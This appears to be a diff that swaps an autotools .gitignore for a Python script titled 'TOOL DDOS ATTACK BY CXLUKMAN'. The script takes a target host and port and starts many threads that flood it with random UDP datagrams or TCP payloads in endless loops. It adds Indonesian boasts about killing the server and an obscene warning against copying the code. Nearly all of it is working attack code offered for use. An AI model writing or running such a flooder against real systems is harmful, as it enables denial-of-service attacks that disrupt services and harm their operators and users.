@@ -1,49 +1,123 @@
-# http://www.gnu.org/software/automake
+"""
+UDP Flooder.
+TOOL DDOS ATTACK BY CXLUKMAN.
+"""
+import signal
+import time
+import socket
+import random
+import threading
+import sys
+import os
+from os import system, name
 
-Makefile.in
-/ar-lib
-/mdate-sh
-/py-compile
-/test-driver
-/ylwrap
+os.system("clear")
+print("\033[1;34;40m \n")
+os.system("figlet DDOS ATTACK -f slant")
+print("\033[1;33;40m If you have any issue post a thread on https://github.com/XaviFortes/Python-UDP-Flood/issues\n")
 
-# http://www.gnu.org/software/autoconf
+os.system("clear")
+print("\033[1;32;40m ==> Code by Cxlukman <==  \n")
+print("\033[1;32;40m ==> PENGGUNAAN KETIK Python-UDP-Flood <==  \n")
+print("\033[1;32;40m ==> CURI SCRIPT AWAS KAU KONTOL <==  \n")
+print("\033[1;32;40m ==> MAU RENAME?REMAKE? PM!! <==  \n")
 
-autom4te.cache
-/autoscan.log
-/autoscan-*.log
-/aclocal.m4
-/compile
-/config.guess
-/config.h.in
-/config.log
-/config.status
-/config.sub
-/configure
-/configure.scan
-/depcomp
-/install-sh
-/missing
-/stamp-h1
+test = input()
+if test == "n":
+	exit(0)
+ip = str(input(" HOST/IP:"))
+port = int(input(" PORT:"))
+choice = str(input(" GAS BUBARIN SERVER?(y/n):"))
+times = int(input(" PAKET NYA BOS:"))
+threads = int(input(" ISI PACKETS:"))
+def run():
+	data = random._urandom(1024)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #It's using the UDP method as you can see in SOCK_DGRAM
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +" PACKETS FROM LUKMAN X AFIT!!!")
+		except:
+			s.close()
+			print("[!] SERVER MATI BOS!!!")
 
-# https://www.gnu.org/software/libtool/
+def run2():
+	data = random._urandom(16)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #And here it's using the TCP method as you can see in SOCK_STREAM
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" PACKETS FROM LUKMAN X AFIT!!!")
+		except:
+			s.close()
+			print("[*] SERVER MATI BOS!!!")
 
-/ltmain.sh
+for y in range(threads):
+	if choice == 'y':
+		th = threading.Thread(target = run)
+		th.start()
+	else:
+		th = threading.Thread(target = run2)
+		th.start()
 
-# http://www.gnu.org/software/texinfo
+def new():
+	for y in range(threads):
+		if choice == 'y':
+			th = threading.Thread(target = run)
+			th.start()
+		else:
+			th = threading.Thread(target = run2)
+			th.start()
 
-/texinfo.tex
+def whereuwere():
+    print("Aww man, I'm so sorry, but I can't remember if u were in TCP or UDP")
+    print("Put 1 for UDP and 2 for TCP")
+    whereman = str(input(" 1 or 2 >:("))
+    if whereman == '1':
+        run()
+    else:
+        run2()
 
-# http://www.gnu.org/software/m4/
+def clear():
+	# for windows
+    if name == 'nt':
+        _ = system('cls')
 
-m4/libtool.m4
-m4/ltoptions.m4
-m4/ltsugar.m4
-m4/ltversion.m4
-m4/lt~obsolete.m4
+    # for mac and linux(here, os.name is 'posix')
+    else:
+        _ = system('clear')
 
-# Generated Makefile 
-# (meta build system like autotools, 
-# can automatically generate from config.status script
-# (which is called by configure script))
-Makefile
+def byebye():
+	clear()
+	os.system("figlet Youre Leaving Sir -f slant")
+	sys.exit(130)
+
+def exit_gracefully(signum, frame):
+    # restore the original signal handler as otherwise evil things will happen
+    # in raw_input when CTRL+C is pressed, and our signal handler is not re-entrant
+    signal.signal(signal.SIGINT, original_sigint)
+
+    try:
+        exitc = str(input(" Ngapain Close Lagi Lah <3 ?:"))
+        if exitc == 'y':
+
+            byebye()
+
+    except KeyboardInterrupt:
+        print("Ok ok, quitting")
+        byebye()
+
+    # restore the exit gracefully handler here
+    signal.signal(signal.SIGINT, exit_gracefully)
+
+if __name__ == '__main__':
+    # store the original SIGINT handler
+    original_sigint = signal.getsignal(signal.SIGINT)
+    signal.signal(signal.SIGINT, exit_gracefully)
